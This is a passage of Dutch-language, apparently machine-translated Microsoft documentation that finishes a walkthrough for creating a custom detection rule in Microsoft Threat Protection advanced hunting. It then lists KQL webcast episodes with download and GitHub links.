4.  Bepaal welke actie moet worden uitgevoerd als de waarschuwing wordt geactiveerd. In dit geval voert u een antivirus scan uit, maar u kunt wel andere acties ondernemen. 

    ![Schermafbeelding van de pagina detectieregel maken waarop u een antivirus scan kunt uitvoeren wanneer een waarschuwing wordt geactiveerd voor het oplossen van bedreigingen](../../media/mtp/fig25.png) 

5.  Selecteer het bereik voor de waarschuwingsregel. Aangezien deze query gebruikmaakt van apparaten, zijn de apparaatgroepen relevant voor deze aangepaste detectie overeenkomstig de Microsoft Defender ATP-context.  Bij het maken van een aangepaste detectie die geen apparaten bevat als gevolg van een entiteit, is het bereik niet van toepassing.  

    ![Schermafbeelding van de pagina detectieregel maken waar u de verwachtingen voor de waarschuwingsregel kunt instellen voor de resultaten die u ziet](../../media/mtp/fig26.png) 

Voor deze pilot kunt u de regel beperkingen toepassen op een subset van testapparaten in uw productieomgeving.

6.  Selecteer **Maken**.  Selecteer vervolgens **aangepaste detectieregels** in het navigatiedeelvenster.
 
    ![Schermafbeelding van de optie voor aangepaste detectieregels in het menu](../../media/mtp/fig27a.png) 

    ![Schermafbeelding van de pagina detectieregels waarop de regel en de details van de uitvoering worden weergegeven](../../media/mtp/fig27b.png) 

Op deze pagina kunt u de detectieregel selecteren waarmee een detailpagina wordt geopend. 

![Schermafbeelding van de pagina met e-mailbijlagen waarop u de status van de regel uitvoer, geactiveerde waarschuwingen en acties, de detectie bewerkt, enzovoort kunt zien](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Aanvullende geavanceerde jacht Walk-in-oefeningen

Als u meer wilt weten over een geavanceerde jacht, kunt u via de volgende webcasts de mogelijkheden van een geavanceerde jacht in Microsoft Threat Protection (MTP) volgen om query's met meerdere pijler te maken, naar entiteiten te draaien en aangepaste detecties en herstelacties te maken.

>[!NOTE]
>Bereid u voor voorbereiding met uw eigen GitHub-account voor het uitvoeren van de jagers-query's in uw test testomgeving.  

| **Title** | **Beschrijving** | **MP4 downloaden** | **Op YouTube letten** | **CSL-bestand voor gebruik** |
|:-----|:-----|:-----|:-----|:-----|
| Aflevering 1: basisprincipes van KQL | We bespreken de basisbeginselen van de geavanceerde jacht functies in Microsoft Threat Protection. Lees meer over de beschikbare geavanceerde jacht-gegevens en de Basic KQL syntaxis en operatoren. | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [Aflevering 1: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| Aflevering 2: joins | We gaan verder met het leren van gegevens in de geavanceerde jacht en het samenvoegen van tabellen. Meer informatie over binnenste, Outer, unieke en semi joins en de nuances van de standaard Kusto innerunique join. | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [Aflevering 2: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| Aflevering 3: gegevens samenvatten, draaien en visualiseren|Nu kunnen we gegevens filteren, manipuleren en samenvoegen, het is tijd om te beginnen met het samenvatten, spuiten, draaien en visualiseren. In deze aflevering houden we de operator voor samenvatten samen en maken enkele van de berekeningen die u kunt uitvoeren in extra tabellen in het schema geavanceerde jacht. De gegevenssets worden omgezet in grafieken die de analyse kunnen helpen verbeteren. | [MP4](https://aka.ms/MTP29JUL20_MP4) | [YouTube](https://youtu.be/UKnk9U1NH6Y) | [Aflevering 3: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| Aflevering 4: laten we beginnen. KQL toepassen op incidenten bijhouden|Tijd voor het bijhouden van enkele kwaad willekeurige activiteiten. In deze aflevering gebruiken we onze verbeterde inzichten in KQL en de Advanced jacht in Microsoft Threat Protection om een aanval te volgen. In dit artikel leest u enkele tips en trucs die in het veld worden gebruikt voor het bijhouden van de activiteit van derden, waaronder de ABCs van Cyber Security en hoe u ze kunt toepassen op de reactie van een incident. | [MP4](https://aka.ms/MTP5AUG20_MP4) | [YouTube](https://youtu.be/2EUxOc_LNd8) | [Aflevering 4: CSL-bestand in Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a>Volgende stap
|![De fase sluiten en samenvatting](../../media/mtp/close.png) <br>[De fase sluiten en samenvatting](mtp-pilot-close.md) | Analyseer uw testresultaten voor Microsoft Threat Protection, presenteer ze voor uw belanghebbenden en voer de volgende stap uit.
|:-----|:-----|

